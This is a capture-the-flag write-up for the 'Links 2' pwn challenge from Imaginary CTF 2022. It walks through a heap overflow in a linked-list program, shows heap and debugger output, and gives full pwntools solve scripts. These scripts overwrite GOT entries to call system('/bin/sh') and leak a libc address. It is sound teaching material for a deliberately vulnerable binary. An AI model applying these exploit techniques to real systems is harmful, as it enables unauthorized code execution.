---
name: Links 2 (2022)
event: Imaginary CTF 2022
category: Pwn
description: Writeup for Links 2 (Pwn) - Imaginary CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Links 2

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/GCkHwYBlsN8/0.jpg)](https://www.youtube.com/watch?v=GCkHwYBlsN8 "Links 2")

## Description

> It turns out that there was a bug in how I was handling writing some elements, so I've fixed that. Also, I've stopped putting the flag in a global variable, because that's probably not a good idea. Double check my implementation one more time for me?

**[download challenge binary](https://imaginaryctf.org/r/1vZsk#links2)**

## Source

{% code overflow="wrap" %}
```c
void main(void)
{
  FILE *pFVar1;

  setbuf(stdout,(char *)0x0);
  pFVar1 = fopen("./flag.txt","r");
  __isoc99_fscanf(pFVar1,&DAT_004021b5,flag);
  do {
    menu();
  } while( true );
}
```
{% endcode %}

#### View elements in the linked list

{% code overflow="wrap" %}
```c
void view_list(void)
{
  long i;
  uint j;

  if (head == 0) {
    puts("No elements in list!\n");
  }
  else {
    j = 0;
    for (i = head; i != 0; i = *(long *)(i + 0x40)) {
      printf("%d: %s\n",(ulong)j,i);
      j = j + 1;
    }
    putchar(10);
  }
  return;
}
```
{% endcode %}

#### Write elements to the list

{% code overflow="wrap" %}
```c
ssize_t write(int __fd,void *__buf,size_t __n)
{
  int iVar1;
  undefined4 extraout_var;
  ssize_t sVar2;
  uint index;
  void *prev;
  int i;
  void *next;
  void *tail;
  void *element;

  puts("What element index would you like to write to?");
  printf("Valid values: 0 to %d, inclusive\n\n",(ulong)max_len);
  printf(">>> ");
  __isoc99_scanf(&DAT_004020b3,&index,&dead);
  if (((int)index < 0) || ((int)max_len < (int)index)) {
    iVar1 = puts("Invalid index!");
    sVar2 = CONCAT44(extraout_var,iVar1);
  }
  else {
                    /* add/modify head node */
    if (index == 0) {
      if (head == (void *)0x0) {
        head = malloc(0x48);
        max_len = max_len + 1;
      }
                    /* write data to node */
      sVar2 = write_data(head);
    }
    else {
                    /* add node to tail */
      if (index == max_len) {
        element = malloc(0x48);
                    /* set node pointer to null */
        *(undefined8 *)((long)element + 0x40) = 0;
        max_len = max_len + 1;
        tail = head;
                    /* traverse list, from head to tail */
        for (next = *(void **)((long)head + 0x40); next != (void *)0x0;
            next = *(void **)((long)next + 0x40)) {
          tail = next;
        }
                    /* set old tail to point to new tail */
        *(void **)((long)tail + 0x40) = element;
                    /* write data to the node */
        sVar2 = write_data(element);
      }
      else {
                    /* change node in middle */
        i = 1;
        prev = head;
                    /* find correct node index */
        element = *(void **)((long)head + 0x40);
        for (; (element != (void *)0x0 && (i < (int)index)); i = i + 1) {
                    /* update node pointers */
          prev = element;
          element = *(void **)((long)element + 0x40);
        }
                    /* write data to node */
        sVar2 = write_data(element);
      }
    }
  }
  return sVar2;
}
```
{% endcode %}

#### Write data to an element in the list

{% code overflow="wrap" %}
```c
void write_data(char *param_1)
{
  char *i;

  puts("What data do you want to write to this element?\n");
  printf(">>> ");
  fgets(param_1,100,stdin);
  for (i = param_1; *i != '\n'; i = i + 1) {
  }
  *i = '\0';
  return;
}
```
{% endcode %}

#### View time

{% code overflow="wrap" %}
```c
void view_time(void)
{
  system("date");
  return;
}
```
{% endcode %}

## Solution

In the last challenge, `Links 1`, we exploited a vulnerable linked list implementation by overwriting a link with the flag address. When we proceeded to view the list, it printed the flag. See the **[video walkthrough](https://youtu.be/COlJwjGq6nA)** and **[solve script](https://TODO)** first so I can minimise repetition.

The only change in the `Links 2` source code is that the flag.txt file is not opened. Therefore, we must focus on the `view_time` function. If we could overwrite the `"date"` string section, it would call `system("our_input")` and we could supply `"/bin/sh"`. However, the `"date"` string is in `.rodata`, therefore read-only.

This challenge took me a while to solve, and I had to rethink my approach, so rather than jumping straight to my solution, let's go over some basics and see how we can overcome the problems I ran into when solving.

### Reviewing Heap Laylout (PwnDbg)

We'll visualise the heap layout. First, Create a head node (pos=0) and check `heap`.

{% code overflow="wrap" %}
```sh
Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x4056f0
Size: 0x20911
```
{% endcode %}

Confirm with `vis_heap_chunks` (or just `vis`).

{% code overflow="wrap" %}
```sh
0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
0x4056c0	0x0000000000000000	0x0000000000000000	................
0x4056d0	0x0000000000000000	0x0000000000000000	................
0x4056e0	0x0000000000000000	0x0000000000000000	................
0x4056f0	0x0000000000000000	0x0000000000020911	................	 <-- Top chunk
```
{% endcode %}

Although `malloc(0x48)` is called, an 80 byte (`0x50`) chunk is returned (`0x4056a0`). We see `0x51` because the `0x1` at the LSB indicates the previous chunk is **not** free. Our input `"CHUNK_0"` immediately follows in the chunk data.

Note the `Top chunk` at (`0x4056f0`) has a size of `0x20911`. We'll see this decrease in size each time malloc allocates more data.

We create a second node (pos=1) and check `heap` and `vis_heap_chunks` again. Note the decrease in the size of the `Top chunk`.

{% code overflow="wrap" %}
```sh
Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x51

Allocated chunk | PREV_INUSE
Addr: 0x4056f0
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x405740
Size: 0x208c1
```
{% endcode %}

{% code overflow="wrap" %}
```sh
0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
0x4056c0	0x0000000000000000	0x0000000000000000	................
0x4056d0	0x0000000000000000	0x0000000000000000	................
0x4056e0	0x0000000000000000	0x0000000000000000	................
0x4056f0	0x0000000000405700	0x0000000000000051	.W@.....Q.......
0x405700	0x00315f4b4e554843	0x0000000000000000	CHUNK_1.........
0x405710	0x0000000000000000	0x0000000000000000	................
0x405720	0x0000000000000000	0x0000000000000000	................
0x405730	0x0000000000000000	0x0000000000000000	................
0x405740	0x0000000000000000	0x00000000000208c1	................	 <-- Top chunk
```
{% endcode %}

Our second chunk is at `0x4056f0`, and we can see our input `"CHUNK_1"`.

Note that our second chunk at `0x4056f0` holds the address of our first chunk's data (`0x405700`); this is the address written by the custom linked list implementation, i.e. it's not a feature of the heap or malloc itself. The line of code responsible for setting this address:

{% code overflow="wrap" %}
```c
/* set old tail to point to new tail */
*(void **)((long)tail + 0x40) = element;
```
{% endcode %}

So whenever we added a new tail node, the last 8 bytes of the previous tail node were updated to point to the data section of the new node.

Our new tail node points to `NULL`, evidenced by the fact `0x405740` is set to `0x0` and resulting from the following line of code:

{% code overflow="wrap" %}
```c
/* set node pointer to null */
*(undefined8 *)((long)element + 0x40) = 0;
```
{% endcode %}

We create a third element (pos=2) and check `heap` and `vis_heap_chunks` again.

{% code overflow="wrap" %}
```sh
Allocated chunk | PREV_INUSE
Addr: 0x4056a0
Size: 0x51

Allocated chunk | PREV_INUSE
Addr: 0x4056f0
Size: 0x51

Allocated chunk | PREV_INUSE
Addr: 0x405740
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x405790
Size: 0x20871
```
{% endcode %}

{% code overflow="wrap" %}
```sh
0x4056a0	0x0000000000000000	0x0000000000000051	........Q.......
0x4056b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
0x4056c0	0x0000000000000000	0x0000000000000000	................
0x4056d0	0x0000000000000000	0x0000000000000000	................
0x4056e0	0x0000000000000000	0x0000000000000000	................
0x4056f0	0x0000000000405700	0x0000000000000051	.W@.....Q.......
0x405700	0x00315f4b4e554843	0x0000000000000000	CHUNK_1.........
0x405710	0x0000000000000000	0x0000000000000000	................
0x405720	0x0000000000000000	0x0000000000000000	................
0x405730	0x0000000000000000	0x0000000000000000	................
0x405740	0x0000000000405750	0x0000000000000051	PW@.....Q.......
0x405750	0x00325f4b4e554843	0x0000000000000000	CHUNK_2.........
0x405760	0x0000000000000000	0x0000000000000000	................
0x405770	0x0000000000000000	0x0000000000000000	................
0x405780	0x0000000000000000	0x0000000000000000	................
0x405790	0x0000000000000000	0x0000000000020871	........q.......	 <-- Top chunk
```
{% endcode %}

Our third chunk is at `0x405740`, and we can see our input `"CHUNK_2"`.

Now, the start of our third chunk (`0x405740`) contains the address of the third chunk's data (`0x406940`).

### Overwriting the GOT

In `Links 1`, we overflowed one of the elements in the list, overwriting the pointer with the address of `bss.flag`. We then viewed the list to print the element. But what if we had tried to write to the element instead? Spoiler; it would write our input to the `bss.flag`.

We can't do that with the `"date"` string (`0x4020c7`) because it's in `.rodata`, therefore read-only. Instead, we can try to overwrite an entry in the global offset table (GOT). We can use `checksec` to ensure that `Full RELRO` is not enabled, as it would prevent us from writing to the GOT.

{% code overflow="wrap" %}
```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
{% endcode %}

But which Lib-C function call should we replace with `system()`? We need to find one that will:

1. Not break the program before we can get a shell
2. Take a parameter (RDI) that we can control (to get "/bin/sh" in there)

You may also be wondering how we can get the address of a "/bin/sh" string to populate the RDI in the first place? We could potentially:

1. Write "/bin/sh" to a writeable section of the program, e.g. `.bss`
2. Leak the address of "/bin/sh" from Lib-C
3. Write "/bin/sh" to the list and leak the address

It would be even better if we could find a function that takes in a char\* from the user and pops it into the RDI for use in a Lib-C function 👀

It just so happens that we have precisely that. The `write_data` function writes our input to an element of the list. It takes our input as a char pointer.

{% code overflow="wrap" %}
```c
void write_data(char *param_1)
```
{% endcode %}

Inside the function, `*param_1` (our user input) is supplied as the first parameter to `fgets`.

{% code overflow="wrap" %}
```c
fgets(param_1,100,stdin);
```
{% endcode %}

Therefore, our input will be popped into the RDI. We should get a shell if we can replace the `fgets` function with `system` and supply our "/bin/sh" string.

So our plan of action is as follows:

1. Add a few nodes to the list
2. Modify a middle node, ensuring the data begins with "/bin/sh" and fills the 64-byte data so that we can overflow the link with the address of `got.fgets`
3. Modify the next node (the one now pointing to `got.fgets`) and write the address of `got.system`
4. Try to modify the node where we wrote "/bin/sh", triggering `write_data` and therefore calling `system("/bin/sh")` instead of the intended `fgets`

A couple of things to mention:

-   To populate the address of `got.system`, the function must be called. Therefore we call the `view_time` function before doing our arbitrary write.
-   Calling `view_time` breaks my usual `gdb.debug` command; hence the `gdb.attach` command in the script. We can use that to debug but unfortunately lose access to the `heap` and `vis_heap_chunks` commands. If you want to debug using the standard method, comment out the "View time" line of code.

We'll create a PwnTools script, setting a breakpoint at `write_data`.

{% code overflow="wrap" %}
```py
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break write_data
continue
'''.format(**locals())

# Binary filename
exe = './links2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# View time (populate system() in GOT)
io.sendlineafter(b'>>>', b'3')

# Add 3 elements to list
for i in range(3):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', str(i).encode())
    io.sendlineafter(b'>>>', b'CHUNK_' + str(i).encode())

# Modify element in list
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'1')
# Overwrite the link to point to GOT entry, 0x51 for next chunk size to keep list intact
io.sendlineafter(b'>>>', b'/bin//sh' + (b'\x00' * 56) + flat([elf.got.fgets, 0x51]))

# Add element to list
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', flat([elf.got.system]))

# Might need for debugging heap where gdb.debug fails
# gdb.attach(io, gdbscript='''
# init-pwndbg
# continue
# ''')

# See if we've got a shell
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'1')

# Got Shell?
io.interactive()
```
{% endcode %}

Note when we overwrite the link in the list, we submit `0x51` afterwards to keep our heap intact, e.g. if we don't specify the next chunk's size, the heap won't know where it ends, and the next chunk begins. See the following output when we **don't** supply `0x51`.

{% code overflow="wrap" %}
```sh
0xd4c240	0x0000000000000000	0x0000000000000000	................
0xd4c250	0x0000000000000000	0x0000000000000000	................
0xd4c260	0x0000000000000000	0x0000000000000000	................
0xd4c270	0x0000000000000000	0x0000000000000000	................
0xd4c280	0x0000000000000000	0x0000000000000000	................
0xd4c290	0x0000000000000000	0x0000000000000000	................
0xd4c2a0	0x0000000000000000	0x0000000000000051	........Q.......
0xd4c2b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
0xd4c2c0	0x0000000000000000	0x0000000000000000	................
0xd4c2d0	0x0000000000000000	0x0000000000000000	................
0xd4c2e0	0x0000000000000000	0x0000000000000000	................
0xd4c2f0	0x0000000000d4c300	0x0000000000000051	........Q.......
0xd4c300	0x68732f2f6e69622f	0x0000000000000000	/bin//sh........
0xd4c310	0x0000000000000000	0x0000000000000000	................
0xd4c320	0x0000000000000000	0x0000000000000000	................
0xd4c330	0x0000000000000000	0x0000000000000000	................
```
{% endcode %}

But when **do** we supply the `0x51`, the top chunk is visible.

{% code overflow="wrap" %}
```sh
0x224e2a0	0x0000000000000000	0x0000000000000051	........Q.......
0x224e2b0	0x00305f4b4e554843	0x0000000000000000	CHUNK_0.........
0x224e2c0	0x0000000000000000	0x0000000000000000	................
0x224e2d0	0x0000000000000000	0x0000000000000000	................
0x224e2e0	0x0000000000000000	0x0000000000000000	................
0x224e2f0	0x000000000224e300	0x0000000000000051	..$.....Q.......
0x224e300	0x68732f2f6e69622f	0x0000000000000000	/bin//sh........
0x224e310	0x0000000000000000	0x0000000000000000	................
0x224e320	0x0000000000000000	0x0000000000000000	................
0x224e330	0x0000000000000000	0x0000000000000000	................
0x224e340	0x0000000000404040	0x0000000000000051	@@@.....Q.......
0x224e350	0x00325f4b4e550000	0x0000000000000000	..UNK_2.........
0x224e360	0x0000000000000000	0x0000000000000000	................
0x224e370	0x0000000000000000	0x0000000000000000	................
0x224e380	0x0000000000000000	0x0000000000000000	................
0x224e390	0x0000000000000000	0x000000000001fc71	........q....... <-- Top chunk
```
{% endcode %}

If we check the `got` command, we'll see that `fgets` has been overwritten with `system`.

{% code overflow="wrap" %}
```sh
[0x404040] fgets@GLIBC_2.2.5 -> 0x404030 (system@got[plt]) —▸ 0x7fecc1f7fe50 (system) ◂— test   rdi, rdi
```
{% endcode %}

Notice the `0x7fecc1f7fe50` address; this is the address of `system` in Lib-C. Now compare that to when we **don't** call `view_time` before overwriting the GOT entry. This will be important later.

{% code overflow="wrap" %}
```sh
[0x404040] fgets@GLIBC_2.2.5 -> 0x404030 (system@got[plt]) —▸ 0x401066 (system@plt+6) ◂— push   3
```
{% endcode %}

So what happens when we run through the whole exploit?

{% code overflow="wrap" %}
```sh
Program received signal SIGSEGV, Segmentation fault.
0x0000000000404030 in system@got[plt] ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xdf1300 ◂— '/bin//sh'
 RBX  0x0
 RCX  0x0
 RDX  0x7f5183555980 (_IO_2_1_stdin_) ◂— 0xfbad2088
 RDI  0xdf1300 ◂— '/bin//sh'
 RSI  0x64
 R8   0x31
 R9   0x4
 R10  0x402059 ◂— 0x57000000203e3e3e /* '>>> ' */
 R11  0x246
 R12  0x4010b0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7ffc1c97c540 —▸ 0x7ffc1c97c580 —▸ 0x7ffc1c97c5a0 —▸ 0x7ffc1c97c5b0 —▸ 0x401520 (__libc_csu_init) ◂— ...
 RSP  0x7ffc1c97c518 —▸ 0x401246 (write_data+65) ◂— mov    rax, qword ptr [rbp - 0x18]
 RIP  0x404030 (system@got[plt]) —▸ 0x7f51833dfe50 (system) ◂— test   rdi, rdi
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x404030 <system@got[plt]>    push   rax
```
{% endcode %}

The RIP contains `system` and the RDI contains the address of "/bin//sh", yet we got a segfault! The reason is due to stack alignment. Notice that RSP holds `0x7ffc1c97c518`; the trailing `8` indicates that the stack is not 16-byte aligned.

### Stack Alignment

> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

**[Source](https://ropemporium.com/guide.html)**

Stack alignment issues come up in pwn challenges **a lot**, and the solution typically involves inserting a `ret` instruction into the payload, which we can easily find with a tool like `ropper`. You can learn a lot more about x64 stack alignment **[here](https://hackyboiz-github-io.translate.goog/2020/12/06/fabu1ous/x64-stack-alignment/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en)**.

However, in this case, we don't have control of the stack. Instead, we can try to jump to `system+1`, i.e. skip the first `push rax` instruction, which is causing a segfault.

{% code overflow="wrap" %}
```sh
 ► 0x404030 <system@got[plt]>    push   rax
```
{% endcode %}

This raises a new problem. Namely, the `got.system` address is `0x404030`, so if we enter `system+1` it will be `0x404031`. Let's review the GOT.

{% code overflow="wrap" %}
```c
                  PTR_system_00404030                   XREF[1]:  system:00401060
 00404030 18 50       addr     <EXTERNAL>::system                    ; = ??
                  PTR_printf_00404038                   XREF[1]:  printf:00401070
 00404038 20 50       addr     <EXTERNAL>::printf                    ; = ??
```
{% endcode %}

`got.printf` begins at `0x404038`, so if we write 8 bytes to `0x404031`, we'll overwrite the first byte of `got.printf` **and** miss the first byte of `got.system`.

The problem is that the GOT holds a pointer to the function addresses in the Lib-C library. If we want to access `system+1`, we must first find the actual address of `libc.system` (rather than `got.system`).

We can leak the Lib-C address the same way we leaked the `flag` in the last challenge. We'll overwrite a link, making the next element point to `got.system` (after ensuring the GOT entry is populated), then view the list and extract the address.

We can proceed with the remainder of the exploit, overwriting `got.fgets` with `leaked_system+1` instead of `got.system`. We get a shell and run `cat flag.txt` 🙂

{% code overflow="wrap" %}
```sh
python exploit.py REMOTE puzzler7.imaginaryctf.org 2007
[+] Opening connection to puzzler7.imaginaryctf.org on port 2007: Done
[*] leaked got_system: 0x7f4f6a53dd60
[*] Switching to interactive mode
 What data do you want to write to this element?

>>> $ cat flag.txt
ictf{who_knew_the_current_date_could_be_so_dangerous?}$
```
{% endcode %}

**edit:** `system+1` was not required. When we leak the Lib-C address, we can call it directly from the base. If we setup a breakpoint at `write_data` and step through until the `fgets` (`system`) call:

{% code overflow="wrap" %}
```sh
 RSP  0x7fff526190b0 ◂— 0x0
*RIP  0x401241 (write_data+60) ◂— call   0x401080
──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
   0x401229 <write_data+36>    call   printf@plt                      <printf@plt>

   0x40122e <write_data+41>    mov    rdx, qword ptr [rip + 0x2e4b] <stdin@GLIBC_2.2.5>
   0x401235 <write_data+48>    mov    rax, qword ptr [rbp - 0x18]
   0x401239 <write_data+52>    mov    esi, 0x64
   0x40123e <write_data+57>    mov    rdi, rax
 ► 0x401241 <write_data+60>    call   fgets@plt                      <fgets@plt>
        s: 0x2394300 ◂— '/bin//sh'
        n: 0x64
        stream: 0x7f174e9c6980 (_IO_2_1_stdin_) ◂— 0xfbad2088
```
{% endcode %}

Notice that the RSP (`0x7fff526190b0`) no longer ends with an `8`, like it did when we were getting a segfault.

**double edit:** After reading the official write-up, I realised my mistake of using `system+1`. I had misinterpreted the advice, as in theirs they use the PLT address of system, rather than leaking from Lib-C. There's a good summary of PLT vs GOT (and plt.got vs got.plt) **[HERE](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)**.

> TL;DR: Those starting with .plt contain stubs to jump to the target, those starting with .got are tables of the target addresses.

Here's a snippet of the `plt.system` section of the binary. We should of used `0x401060` in this instance.

{% code overflow="wrap" %}
```c
thunk int system(char * __command)
      Thunked-Function: <EXTERNAL>::system
int           EAX:4      <RETURN>
char *        RDI:8      __command
        <EXTERNAL>::system     XREF[1]:  view_time:0040141a(c)
00401060 ff 25       JMP      qword ptr [-><EXTERNAL>::system]
00401066 68 03       PUSH     0x3
0040106b e9 b0       JMP      FUN_00401020
```
{% endcode %}

## Solve Script

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break write_data
continue
'''.format(**locals())

# Binary filename
exe = './links2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# View time (populate system() in GOT)
io.sendlineafter(b'>>>', b'3')

# Add 5 elements to list
for i in range(5):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', str(i).encode())
    io.sendlineafter(b'>>>', b'CHUNK_' + str(i).encode())

# Overflow element pointer with got.system address
# This is because we need libc leak for x64 stack align
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'3')
# Overwrite the link to point to GOT entry, 0x51 for next chunk size to keep list intact
io.sendlineafter(b'>>>', (b'\x00' * 64) + flat([elf.got.system, 0x51]))

# View list (leak libc.system() address)
io.sendlineafter(b'>>>', b'1')
io.recvuntil(b'3: ')
system = unpack(io.recv()[4:10].ljust(8, b'\x00'))
info("leaked got_system: %#x", system)

# Modify element in list
io.sendline(b'2')
io.sendlineafter(b'>>>', b'1')
# Overwrite the link to point to GOT entry, 0x51 for next chunk size to keep list intact
io.sendlineafter(b'>>>', b'/bin//sh' + (b'\x00' * 56) + flat([elf.got.fgets, 0x51]))

# Add element to list
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'2')
# Overwrite got.fgets with system (+1 for for stack alignment)
io.sendlineafter(b'>>>', flat(system + 1))

# See if we've got a shell
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'1')
# Got Shell?
io.interactive()
```
{% endcode %}
